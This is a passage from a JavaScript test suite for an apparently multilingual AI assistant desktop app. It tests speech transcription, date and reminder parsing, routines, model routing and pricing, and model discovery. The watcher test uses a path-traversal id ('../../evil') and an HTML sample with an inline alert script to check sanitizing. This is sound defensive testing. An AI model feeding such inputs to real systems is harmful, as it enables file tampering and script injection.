  // Whisper route (cycle 7) — hermetic via injected fetch.
  let captured = null
  const okFetch = async (url, opts) => { captured = { url, opts }; return { ok: true, json: async () => ({ text: '  مرحبا بالعالم  ' }) } }
  const r4 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', lang: 'ar', getApiKey: keys({ openai: 'sk-k' }), _fetch: okFetch })
  check('whisper success → trimmed text + backend', r4.text === 'مرحبا بالعالم' && r4.backend === 'openai')
  check('whisper hits the transcriptions endpoint', captured.url.includes('/v1/audio/transcriptions'))
  check('multipart carries model + language hint', captured.opts.body.get('model') === 'whisper-1' && captured.opts.body.get('language') === 'ar')
  check('auth header uses the user key', captured.opts.headers.Authorization === 'Bearer sk-k')
  const r5 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', getApiKey: keys({ openai: 'k' }), _fetch: async () => ({ ok: false, status: 401, text: async () => '' }) })
  check('401 → key-rejected', r5.error === 'key-rejected')
  const r6 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', getApiKey: keys({ openai: 'k' }), _fetch: async () => ({ ok: true, json: async () => ({ text: '   ' }) }) })
  check('blank transcript → no-speech', r6.error === 'no-speech')
  const r7 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', getApiKey: keys({ openai: 'k' }), _fetch: async () => { throw new Error('ENOTFOUND api.openai.com') } })
  check('network failure → stt-network', r7.error === 'stt-network')

  // Gemini route (cycle 9) — google-key-only users can speak too.
  let gcap = null
  const gFetch = async (url, opts) => {
    gcap = { url, body: JSON.parse(opts.body), headers: opts.headers }
    return { ok: true, json: async () => ({ candidates: [{ content: { parts: [{ text: ' 你好' }, { text: '世界 ' }] } }] }) }
  }
  const g1 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', lang: 'zh', getApiKey: keys({ google: 'g-key' }), _fetch: gFetch })
  check('gemini success → joined trimmed text + backend', g1.text === '你好世界' && g1.backend === 'google')
  check('gemini hits generateContent with key header', gcap.url.includes(voice.GEMINI_STT_MODEL + ':generateContent') && gcap.headers['x-goog-api-key'] === 'g-key')
  check('gemini payload carries inline audio + temp 0', !!gcap.body.contents[0].parts[1].inline_data.data && gcap.body.generationConfig.temperature === 0)
  const g2 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', getApiKey: keys({ google: 'g' }), _fetch: async () => ({ ok: false, status: 403, text: async () => '' }) })
  check('gemini 403 → key-rejected', g2.error === 'key-rejected')
  const g3 = await voice.transcribe({ buffer: Buffer.from('xx'), mime: 'audio/webm', getApiKey: keys({ google: 'g' }), _fetch: async () => ({ ok: true, json: async () => ({ candidates: [] }) }) })
  check('gemini empty candidates → no-speech', g3.error === 'no-speech')
}

// ═══════════════════════════════════════════════════════════════
// TEST 16: paperwork-dates — deadline extraction + reminder timing
// ═══════════════════════════════════════════════════════════════
console.log('\n[16/16] paperwork-dates — deadline extraction + reminder timing')
{
  const { extractDeadlineDate, reminderDateFor } = await import('../renderer/js/paperwork-dates.js')

  const iso = (r) => r?.iso
  check('ISO date in Deadline section', iso(extractDeadlineDate('**Deadline** — pay by 2026-07-01.')) === '2026-07-01')
  check('English month-first', iso(extractDeadlineDate('**Deadline**: July 1, 2026')) === '2026-07-01')
  check('English day-first', iso(extractDeadlineDate('**Deadline** — 1 July 2026')) === '2026-07-01')
  check('Chinese date', iso(extractDeadlineDate('**截止日期** —— 2026年7月1日前缴费')) === '2026-07-01')
  check('Arabic heading + ISO', iso(extractDeadlineDate('**الموعد النهائي** — 2026-08-15')) === '2026-08-15')
  check('slashed D/M/Y (day>12)', iso(extractDeadlineDate('**Deadline**: 15/7/2026')) === '2026-07-15')
  check('slashed M/D/Y (second slot>12)', iso(extractDeadlineDate('**Deadline**: 7/15/2026')) === '2026-07-15')
  check('ambiguous slashes default D/M/Y', iso(extractDeadlineDate('**Deadline**: 5/7/2026')) === '2026-07-05')
  check('date outside section still found', iso(extractDeadlineDate('Reply before 2026-09-30 please.')) === '2026-09-30')
  check('no date → null', extractDeadlineDate('**Deadline** — none found.') === null)
  check('invalid Feb 30 rejected', extractDeadlineDate('**Deadline**: 2026-02-30') === null)

  const now = new Date(2026, 5, 11, 12, 0, 0) // 2026-06-11
  const far = reminderDateFor(new Date(2026, 6, 1), now)   // deadline Jul 1
  check('reminder = 3 days before deadline, 9am', far.getMonth() === 5 && far.getDate() === 28 && far.getHours() === 9)
  const near = reminderDateFor(new Date(2026, 5, 12), now) // deadline tomorrow
  check('past 3-day mark clamps to tomorrow', near.getDate() === 12 && near.getMonth() === 5)
  const none = reminderDateFor(null, now)
  check('no deadline → tomorrow 9am', none.getDate() === 12 && none.getHours() === 9)

  // Cycle 14 — Arabic depth: digit normalization + Hijri conversion.
  const { normalizeDigits, hijriToGregorian } = await import('../renderer/js/paperwork-dates.js')
  check('Arabic-Indic digits normalize', normalizeDigits('١٤٤٧/١٢/١٥') === '1447/12/15')
  check('Eastern Arabic-Indic digits normalize', normalizeDigits('۲۰۲۶') === '2026')
  const dayMs = 86400000
  const closeTo = (a, b, days = 2) => Math.abs(a - b) <= days * dayMs
  // 1 Muharram 1447 ≈ 2025-06-26 (Umm al-Qura); tabular is ±1 day.
  check('hijri 1447-01-01 ≈ 2025-06-26', closeTo(hijriToGregorian(1447, 1, 1), new Date(2025, 5, 26, 12)))
  // 9 Dhul-Hijjah 1445 (Arafah) = 2024-06-15.
  check('hijri 1445-12-09 ≈ 2024-06-15', closeTo(hijriToGregorian(1445, 12, 9), new Date(2024, 5, 15, 12)))
  const h1 = extractDeadlineDate('**الموعد النهائي** — ١٤٤٧/١٢/١٥ هـ')
  check('Arabic-digit Hijri date in card parses', !!h1 && h1.date.getFullYear() >= 2026)
  const h2 = extractDeadlineDate('**Deadline**: 15/12/1447 AH')
  check('ASCII Hijri with AH parses to same day', !!h2 && h2.iso === h1.iso)
  const g1 = extractDeadlineDate('**الموعد النهائي** — ٢٠٢٦/٠٧/٠١')
  check('Arabic-digit GREGORIAN date parses', g1?.iso === '2026-07-01')
}

// ═══════════════════════════════════════════════════════════════
// TEST 17: net-ledger — log/recent/clear + host parsing (cycle 16)
// ═══════════════════════════════════════════════════════════════
console.log('\n[17/17] net-ledger — log/recent/clear + host parsing')
{
  const { createRequire } = await import('node:module')
  const fs = await import('node:fs')
  const require = createRequire(import.meta.url)
  const ledger = require('../electron/net-ledger.js')

  ledger.clear()
  check('recent on empty ledger → []', ledger.recent().length === 0)
  ledger.log('api.openai.com', 'chat (openai)')
  ledger.log('localhost', 'chat (local Ollama — stays on this Mac)')
  ledger.log('html.duckduckgo.com', 'web search')
  const r = ledger.recent(10)
  check('three entries recorded', r.length === 3)
  check('newest first', r[0].host === 'html.duckduckgo.com' && r[2].host === 'api.openai.com')
  check('entries carry ts + why', typeof r[0].ts === 'number' && r[1].why.includes('stays on this Mac'))
  check('hostOf parses URLs', ledger.hostOf('https://api.x.ai/v1/chat') === 'api.x.ai')
  check('hostOf tolerates garbage', ledger.hostOf('not a url') === 'unknown')
  check('recent(1) caps results', ledger.recent(1).length === 1)
  ledger.clear()
  check('clear removes the file', !fs.existsSync(ledger.FILE) && ledger.recent().length === 0)
}

// ═══════════════════════════════════════════════════════════════
// TEST 18: schedule-parse — natural-language reminders (cycle 20)
// ═══════════════════════════════════════════════════════════════
console.log('\n[18/18] schedule-parse — natural-language reminders EN/中文/العربية')
{
  const { parseReminder } = await import('../renderer/js/schedule-parse.js')

  const r1 = parseReminder('remind me every friday at 5pm to pay the bills')
  check('EN weekly + pm time', r1?.cron === '0 17 * * 5')
  check('EN task extracted', r1?.task === 'pay the bills')
  const r2 = parseReminder('Remind me every day at 8:30 to take my medication')
  check('EN daily + h:mm', r2?.cron === '30 8 * * *')
  const r3 = parseReminder('remind me every morning to stretch')
  check('EN every morning defaults 9am', r3?.cron === '0 9 * * *')
  const r4 = parseReminder('remind me every month on the 1st to check subscriptions')
  check('EN monthly', r4?.cron === '0 9 1 * *')
  const z1 = parseReminder('提醒我每周五下午5点交水电费')
  check('ZH weekly + 下午', z1?.cron === '0 17 * * 5')
  const z2 = parseReminder('提醒我每天早上9点半喝水')
  check('ZH daily + 点半', z2?.cron === '30 9 * * *')
  const a1 = parseReminder('ذكرني كل جمعة الساعة 5 مساء بدفع الفواتير')
  check('AR weekly + مساء', a1?.cron === '0 17 * * 5')
  const a2 = parseReminder('ذكّرني كل يوم الساعة ٨ صباحاً بالدواء')
  check('AR daily + Arabic digits', a2?.cron === '0 8 * * *')
  check('no trigger word → null', parseReminder('every friday at 5 pay bills') === null)
  check('no schedule → null (goes to model)', parseReminder('remind me to call mom') === null)
  check('long text → null', parseReminder('remind me every day ' + 'x'.repeat(450)) === null)
}

// ═══════════════════════════════════════════════════════════════
// TEST 19: routines catch-up — missed fires run exactly once (cycle 21)
// ═══════════════════════════════════════════════════════════════
console.log('\n[19/22] routines — catch-up for missed fires')
{
  const { createRequire } = await import('node:module')
  const require = createRequire(import.meta.url)
  const routines = require('../electron/routines.js')

  const noonToday = new Date(); noonToday.setHours(12, 0, 0, 0)
  const NOW = noonToday.getTime() // deterministic: today 12:00 local
  const nineAm = new Date(NOW); nineAm.setHours(9, 0, 0, 0)

  check('_prevFire finds this morning 9am from noon',
    routines._prevFire('0 9 * * *', NOW) === nineAm.getTime())
  check('_prevFire null outside window',
    routines._prevFire('0 9 31 2 *', NOW) === null) // Feb 31 never matches

  const mk = (over) => ({ enabled: true, cron: '0 9 * * *', createdAt: NOW - 3 * 86400000, lastRunAt: null, ...over })
  check('missed fire owed when never run',
    routines._catchUpDue(mk({}), NOW) === nineAm.getTime())
  check('not owed when already ran after the slot',
    routines._catchUpDue(mk({ lastRunAt: nineAm.getTime() + 60000 }), NOW) === null)
  check('owed when last run was before the slot',
    routines._catchUpDue(mk({ lastRunAt: nineAm.getTime() - 86400000 }), NOW) === nineAm.getTime())
  check('routine created AFTER the slot does not retro-fire',
    routines._catchUpDue(mk({ createdAt: NOW - 3600000 }), NOW) === null) // created 11:00 today
  check('disabled routine never owed',
    routines._catchUpDue(mk({ enabled: false }), NOW) === null)
}

// ═══════════════════════════════════════════════════════════════
// TEST 20: watchers — page text + change detection (cycle 24)
// ═══════════════════════════════════════════════════════════════
console.log('\n[20/22] watchers — page text + change detection')
{
  const { createRequire } = await import('node:module')
  const fsw = await import('node:fs')
  const require = createRequire(import.meta.url)
  const watchers = require('../electron/watchers.js')

  const html = '<html><head><style>.x{color:red}</style><script>alert(1)</script></head>' +
    '<body><h1>Price:&nbsp;$99</h1>\n\n  <p>In   stock</p></body></html>'
  check('pageText strips tags/scripts/styles + collapses ws',
    watchers.pageText(html) === 'Price: $99 In stock')

  const ID = 'test-watch-' + process.pid
  watchers.reset(ID)
  const c1 = watchers.checkChange(ID, 'Price: $99 In stock')
  check('first check saves baseline', c1.first === true && c1.changed === false)
  const c2 = watchers.checkChange(ID, 'Price: $99 In stock')
  check('same text → no change', c2.changed === false && !c2.first)
  const c3 = watchers.checkChange(ID, 'Price: $79 In stock')
  check('different text → changed with before-excerpt', c3.changed === true && c3.prevHead.includes('$99'))
  const c4 = watchers.checkChange(ID, 'Price: $79 In stock')
  check('change persists as new baseline', c4.changed === false)
  check('hostile id sanitized', (watchers.checkChange('../../evil', 'x'), fsw.existsSync(watchers.DIR + '/______evil.json')))
  watchers.reset(ID); watchers.reset('../../evil')
}

// ═══════════════════════════════════════════════════════════════
console.log('\n[21/22] model picker — routing, pricing, no retired ids')
{
  const { createRequire } = await import('node:module')
  const fsm = await import('node:fs')
  const require = createRequire(import.meta.url)
  const registry = require('../electron/provider-registry.js')

  const html = fsm.readFileSync(new URL('../renderer/index.html', import.meta.url), 'utf8')
  const selectBlock = html.slice(
    html.indexOf('<select class="model-selector" id="model-select"'),
    html.indexOf('</select>', html.indexOf('id="model-select"')),
  )
  check('model-select block found', selectBlock.length > 500)

  // optgroup label → the provider id every model inside it must route to.
  const GROUP_PROVIDER = {
    'Anthropic': 'anthropic',
    'OpenAI': 'openai',
    'xAI': 'xai',
    'Kimi (kimi.com / CN)': 'moonshot',
    'Kimi (kimi.ai / Global)': 'kimi',
    'Qwen (DashScope)': 'dashscope',
    'GLM (Zhipu)': 'zhipu',
    'MiniMax': 'minimax',
    'Tencent Hunyuan': 'hunyuan',
    'DeepSeek': 'deepseek',
    'Google': 'google',
  }

  const options = []   // [{ value, group }]
  for (const g of selectBlock.split('<optgroup').slice(1)) {
    const label = (g.match(/label="([^"]*)"/) || [])[1] || ''
    for (const m of g.matchAll(/<option value="([^"]*)"/g)) {
      options.push({ value: m[1], group: label })
    }
  }
  check('picker exposes a healthy number of models', options.length >= 40)

  // An option with an empty value silently blanks the session model and
  // falls through to the provider default — shipped as a real bug until
  // v0.8 cycle 36. Never again.
  check('no option has an empty value', options.every(o => o.value.trim() !== ''))

  const misrouted = options.filter(o => {
    const expected = GROUP_PROVIDER[o.group]
    return expected && registry.detectProvider(o.value) !== expected
  })
  check('every model routes to its own optgroup\'s provider',
    misrouted.length === 0, misrouted.map(o => `${o.value}→${registry.detectProvider(o.value)}`).join(', '))

  // Model ids the providers have actually retired or that never existed
  // upstream. Each one 404s or errors if a user picks it.
  const RETIRED = [
    'deepseek-chat',            // retired 2026-07-24
    'deepseek-reasoner',        // retired 2026-07-24
    'deepseek-v4',              // bare id never existed (only -pro / -flash)
    'glm-5-air',                // never on any Zhipu model list
    'kimi-k2-thinking-turbo',   // kimi-k2 series discontinued 2026-05-25
    'gpt-5.5-thinking',         // reasoning is a parameter, not an id
    'gpt-5.5-mini',
    'gpt-5.4-thinking',
    'grok-4.20-reasoning',      // undated alias is not documented
    'grok-4.20-non-reasoning',
  ]
  const present = RETIRED.filter(id => options.some(o => o.value === id))
  check('no retired / nonexistent model ids in the picker',
    present.length === 0, present.join(', '))

  // `hy4-*` was a routing prefix for a model generation that never shipped.
  check('bare hy3 routes to hunyuan', registry.detectProvider('hy3') === 'hunyuan')
  check('hy-mt2-pro routes to hunyuan', registry.detectProvider('hy-mt2-pro') === 'hunyuan')

  // Case sensitivity: MiniMax 400s on a lowercased id.
  check('MiniMax id keeps its original case through the router',
    registry.normalizeModelId('MiniMax-M3') === 'MiniMax-M3')
  check('kimi-intl/ prefix is stripped and routes global',
    registry.detectProvider('kimi-intl/kimi-k3') === 'kimi' &&
    registry.normalizeModelId('kimi-intl/kimi-k3') === 'kimi-k3')

  // Every listed model needs a price, or the spend meter — the whole
  // "receipts" promise — silently shows nothing for it.
  const priceBlock = html.slice(html.indexOf('const MODEL_PRICING = {'))
  const priceKeys = [...priceBlock.slice(0, priceBlock.indexOf('\n    }')).matchAll(/^\s+'([^']+)':/gm)].map(m => m[1])
  check('pricing table parsed', priceKeys.length >= 60)
  check('pricing keys are all lowercase (lookup lowercases the model id)',
    priceKeys.every(k => k === k.toLowerCase()))

  const sorted = [...priceKeys].sort((a, b) => b.length - a.length)
  const priceFor = (id) => {
    const lc = id.toLowerCase()
    return sorted.find(k => lc === k || lc.startsWith(k + '-')) || null
  }
  const unpriced = options.filter(o => !priceFor(o.value))
  check('every model in the picker has a price', unpriced.length === 0,
    unpriced.map(o => o.value).join(', '))

  // Spot-check that longest-prefix-wins resolves the tricky overlaps.
  check('deepseek-v4-flash prices apart from deepseek-v4-pro',
    priceFor('deepseek-v4-flash') === 'deepseek-v4-flash' && priceFor('deepseek-v4-pro') === 'deepseek-v4-pro')
  check('hy3-preview does not collapse onto hy3', priceFor('hy3-preview') === 'hy3-preview')
  check('gemini-3.1-pro-preview resolves to the 3.1 Pro row',
    priceFor('gemini-3.1-pro-preview') === 'gemini-3.1-pro')

  // A model this build has never heard of must NOT inherit its
  // predecessor's price. Discovery surfaces exactly these ids, and a
  // confidently wrong number would poison the spend meter.
  check('a future version bump gets no price rather than a stale one',
    priceFor('gpt-5.7-nova') === null && priceFor('grok-4.9') === null &&
    priceFor('claude-opus-6') === null && priceFor('gemini-3.9-pro') === null,
    `${priceFor('gpt-5.7-nova')} / ${priceFor('grok-4.9')}`)
  // ...while real dated snapshots and variants still resolve.
  check('dated snapshots and variants still resolve across the - boundary',
    priceFor('gpt-4o-mini-2024-07-18') === 'gpt-4o-mini' &&
    priceFor('claude-sonnet-4-5-20250929') === 'claude-sonnet-4-5' &&
    priceFor('grok-4.20-0309-reasoning') === 'grok-4.20')

  // Cost tier is derived from the output price, not the model name. The
  // name-regex version it replaced scored gpt-5.6-luna — OpenAI's cheapest
  // model — as 🔴 premium, because "gpt-5." looked like a flagship.
  const outPrice = (id) => {
    const k = priceFor(id)
    if (!k) return null
    const row = priceBlock.match(new RegExp(`'${k.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&')}':\\s*\\{[^}]*out:\\s*([\\d.]+)`))
    return row ? Number(row[1]) : null
  }
  const tierOf = (id) => {
    const out = outPrice(id)
    if (out === null) return 'mid'
    return out <= 5.00 ? 'cheap' : out >= 15.00 ? 'premium' : 'mid'
  }
  check('gpt-5.6-luna is cheap, not premium', tierOf('gpt-5.6-luna') === 'cheap', tierOf('gpt-5.6-luna'))
  check('gpt-5.4-mini and -nano are cheap',
    tierOf('gpt-5.4-mini') === 'cheap' && tierOf('gpt-5.4-nano') === 'cheap')
  check('claude-haiku-4-5 is cheap', tierOf('claude-haiku-4-5') === 'cheap')
  check('gemini-3.6-flash is mid — the Flash tier is not cheap any more',
    tierOf('gemini-3.6-flash') === 'mid', tierOf('gemini-3.6-flash'))
  check('gpt-5.6-sol is premium', tierOf('gpt-5.6-sol') === 'premium')
  check('claude-opus-5 and fable-5 are premium',
    tierOf('claude-opus-5') === 'premium' && tierOf('claude-fable-5') === 'premium')
  check('deepseek-v4-pro (the default) reads cheap', tierOf('deepseek-v4-pro') === 'cheap')
  check('gpt-5.6-terra sits in the middle', tierOf('gpt-5.6-terra') === 'mid')

  // Coverage guard: the picker must actually carry each provider's current
  // flagship. Adding a family to the pricing table but forgetting the
  // <option> is the quiet way a "model refresh" ends up half-done.
  const MUST_HAVE = [
    'claude-sonnet-5', 'claude-opus-5', 'claude-fable-5', 'claude-haiku-4-5',
    'gpt-5.6-sol', 'gpt-5.6-terra', 'gpt-5.6-luna',
    'gemini-3.1-pro-preview', 'gemini-3.6-flash', 'gemini-3.5-flash', 'gemini-3.5-flash-lite',
    'grok-4.5', 'grok-4.3', 'grok-build-0.1',
    'kimi-k3', 'kimi-intl/kimi-k3',
    'qwen3.7-max', 'qwen3.7-plus', 'qwen3.7-flash',
    'glm-5.2', 'glm-4.7-flash',
    'MiniMax-M3', 'hy3', 'deepseek-v4-pro', 'deepseek-v4-flash',
  ]
  const missing = MUST_HAVE.filter(id => !options.some(o => o.value === id))
  check('every current-generation flagship is in the picker',
    missing.length === 0, missing.join(', '))

  // Zhipu's GLM-4.7-Flash is free; the tier badge should say so rather
  // than lumping it in with merely-cheap models.
  check('a $0/$0 model is priced at zero, not missing',
    outPrice('glm-4.7-flash') === 0, String(outPrice('glm-4.7-flash')))
}

// ═══════════════════════════════════════════════════════════════
console.log('\n[22/22] model-discovery — live model lists without a rebuild')
{
  const { createRequire } = await import('node:module')
  const fsd = await import('node:fs')
  const require = createRequire(import.meta.url)
  const disco = require('../electron/model-discovery.js')

  // ── the noise filter ──────────────────────────────────────────
  // /v1/models returns the provider's WHOLE catalogue. Without this
  // filter the extra group is a wall of embeddings and TTS models.
  check('chat models pass the filter',
    ['gpt-5.6-sol', 'claude-opus-5', 'kimi-k3', 'glm-5.2', 'deepseek-v4-pro']
      .every(disco.isChatModel))
  check('non-chat models are filtered out',
    !['text-embedding-3-large', 'whisper-1', 'tts-1-hd', 'dall-e-3',
      'omni-moderation-latest', 'babbage-002', 'gemini-embedding-001',
      'imagen-4.0-generate-001', 'rerank-v1']
      .some(disco.isChatModel))
  check('garbage ids rejected', !disco.isChatModel('') && !disco.isChatModel(null) &&
    !disco.isChatModel('x'.repeat(200)))

  // ── per-provider response shapes ──────────────────────────────
  const fakeFetch = (payload, status = 200) => async () => ({
    ok: status === 200, status, json: async () => payload,
  })

  const openai = await disco.discoverProvider('deepseek', 'sk-test',
    fakeFetch({ data: [{ id: 'deepseek-v4-pro' }, { id: 'deepseek-v4-flash' }, { id: 'text-embedding-x' }] }))
  check('OpenAI-shaped response parsed + filtered',
    openai.models.join(',') === 'deepseek-v4-pro,deepseek-v4-flash', openai.models.join(','))

  const anthropic = await disco.discoverProvider('anthropic', 'sk-ant-test',
    fakeFetch({ data: [{ id: 'claude-opus-5' }, { id: 'claude-sonnet-5' }] }))
  check('Anthropic shape parsed', anthropic.models.length === 2)

  // Google namespaces ids as "models/x" and marks what generateContent
  // supports — strip and honour both or ids won't match the router.
  const google = await disco.discoverProvider('google', 'AIzaTest',
    fakeFetch({ models: [
      { name: 'models/gemini-3.6-flash', supportedGenerationMethods: ['generateContent'] },
      { name: 'models/gemini-embedding-001', supportedGenerationMethods: ['embedContent'] },
      { name: 'models/gemini-3.1-pro-preview', supportedGenerationMethods: ['generateContent'] },
    ] }))
  check('Google prefix stripped + embed-only dropped',
    google.models.join(',') === 'gemini-3.6-flash,gemini-3.1-pro-preview', google.models.join(','))

  // ── failure is never fatal ────────────────────────────────────
  const rejected = await disco.discoverProvider('deepseek', 'bad-key', fakeFetch({}, 401))
  check('401 yields empty list + error, never throws',
    rejected.models.length === 0 && rejected.error === 'http-401')
  const exploded = await disco.discoverProvider('deepseek', 'k', async () => { throw new Error('offline') })
  check('network failure yields empty list, never throws',
    exploded.models.length === 0 && exploded.error === 'network')
  const noKey = await disco.discoverProvider('deepseek', '', fakeFetch({ data: [] }))
  check('no key → no call attempted', noKey.error === 'no-key')

  check('per-provider result is capped',
    (await disco.discoverProvider('deepseek', 'k',
      fakeFetch({ data: Array.from({ length: 500 }, (_, i) => ({ id: 'deepseek-m' + i })) })
    )).models.length === disco.MAX_PER_PROVIDER)

  // ── the cache ─────────────────────────────────────────────────
  try { fsd.unlinkSync(disco.CACHE_FILE) } catch {}
  const getKey = () => 'k'
  let calls = 0
  const countingFetch = async () => { calls++; return { ok: true, status: 200, json: async () => ({ data: [{ id: 'deepseek-v4-pro' }] }) } }

  const T0 = 1_700_000_000_000
  const first = await disco.discoverAll(['deepseek'], getKey, { _fetch: countingFetch, _now: T0 })
  check('first run fetches', calls === 1 && first.fetched.includes('deepseek'))

  const second = await disco.discoverAll(['deepseek'], getKey, { _fetch: countingFetch, _now: T0 + 60_000 })
  check('second run inside TTL serves cache, no call',
    calls === 1 && second.cached.includes('deepseek') && second.models.deepseek.length === 1)

  const later = await disco.discoverAll(['deepseek'], getKey, { _fetch: countingFetch, _now: T0 + disco.CACHE_TTL_MS + 1 })
  check('past the TTL it refetches', calls === 2 && later.fetched.includes('deepseek'))

  const forced = await disco.discoverAll(['deepseek'], getKey, { _fetch: countingFetch, _now: T0 + disco.CACHE_TTL_MS + 2, force: true })
  check('force bypasses a fresh cache', calls === 3 && forced.fetched.includes('deepseek'))

  // A failing refresh must not throw away a good list — otherwise one
  // flaky morning empties the user's picker.
  const failing = async () => { throw new Error('offline') }
  const degraded = await disco.discoverAll(['deepseek'], getKey,
    { _fetch: failing, _now: T0 + (disco.CACHE_TTL_MS * 3), })
  check('a failed refresh keeps serving the stale list',
    degraded.models.deepseek?.length === 1 && degraded.errors.deepseek === 'network')

  // ...and must not stamp a fresh timestamp, or the failure would go
  // unretried for a full day.
  calls = 0
  const retried = await disco.discoverAll(['deepseek'], getKey,
    { _fetch: countingFetch, _now: T0 + (disco.CACHE_TTL_MS * 3) + 1000 })
  check('a failed refresh does not start a fresh 24h of silence', calls === 1)

  check('providers with no key are skipped entirely',
    Object.keys((await disco.discoverAll(['deepseek', 'openai'], (p) => p === 'deepseek' ? 'k' : null,
      { _fetch: countingFetch, _now: T0, })).models).join(',') === 'deepseek')

  try { fsd.unlinkSync(disco.CACHE_FILE) } catch {}

  // ── which discovered ids actually reach the picker ────────────
  // This lives in its own module because window.alaude is frozen by
  // contextBridge, so the browser-side path cannot be stubbed live.
  const { pickDiscoveredExtras } = await import('../renderer/js/model-extras.js')
  const registry = require('../electron/provider-registry.js')
  const routerOf = (id) => registry.detectProvider(id)

  const known = ['claude-opus-5', 'gpt-5.6-sol', 'deepseek-v4-pro']
  const picked = pickDiscoveredExtras({
    anthropic: ['claude-opus-5', 'claude-nextgen-6'],   // one known, one new
    openai:    ['gpt-5.7-nova', 'gpt-5.6-sol'],
    deepseek:  ['deepseek-v5-pro'],
  }, known, routerOf)
  check('only unknown ids are offered',
    picked.join(',') === 'claude-nextgen-6,deepseek-v5-pro,gpt-5.7-nova', picked.join(','))

  // Providers really do list foreign ids (proxying gateways, comparison
  // entries). Offering one would sign the request with the wrong key.
  check('ids that route to a different provider are rejected',
    pickDiscoveredExtras({ zhipu: ['gpt-5.9-turbo'] }, [], routerOf).length === 0)
  check('a correctly-routed id from the same provider is kept',
    pickDiscoveredExtras({ zhipu: ['glm-9'] }, [], routerOf).join(',') === 'glm-9')

  check('known-id match is case-insensitive',
    pickDiscoveredExtras({ minimax: ['MiniMax-M3'] }, ['minimax-m3'], routerOf).length === 0)
  check('duplicates across providers are collapsed',
    pickDiscoveredExtras({ moonshot: ['kimi-k9'], kimi: ['kimi-k9'] }, [], routerOf).length === 1)
  check('a hostile router never breaks the picker',
    pickDiscoveredExtras({ openai: ['gpt-x'] }, [], () => { throw new Error('boom') }).length === 0)
  check('empty / malformed input yields nothing',
    pickDiscoveredExtras(null, [], routerOf).length === 0 &&
    pickDiscoveredExtras({ openai: [null, '', 42] }, [], routerOf).length === 0)
  check('the extra group is capped',
    pickDiscoveredExtras(
      { openai: Array.from({ length: 200 }, (_, i) => 'gpt-x' + i) }, [], routerOf, 60).length === 60)
}

// ═══════════════════════════════════════════════════════════════
console.log('\n' + '━'.repeat(60))
console.log(`  RESULTS: ${pass} passed, ${fail} failed`)
console.log('━'.repeat(60))
if (fail > 0) process.exit(1)
